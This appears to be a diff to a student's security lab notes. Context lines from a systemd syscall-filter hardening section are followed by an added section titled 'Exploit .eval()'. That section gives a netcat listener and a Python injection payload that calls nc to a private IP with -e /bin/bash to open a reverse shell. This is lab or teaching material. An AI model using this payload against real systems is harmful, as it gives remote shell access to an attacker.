@@ -130,3 +130,9 @@ SystemCallFilter=~add_key keyring_search keyring_update truncate getdents getden
 SystemCallFilter+=openat fstat read writev mmap setsockopt accept4 epoll_wait epoll_ctl recvfrom close
 SystemCallErrorNumber=EPERM
 ```
+# Part IV : My shitty app
+Exploit .eval()
+```
+nc -lvnp 12345
+__import__('os').system('nc 172.25.49.49 12345 -e /bin/bash')
+```
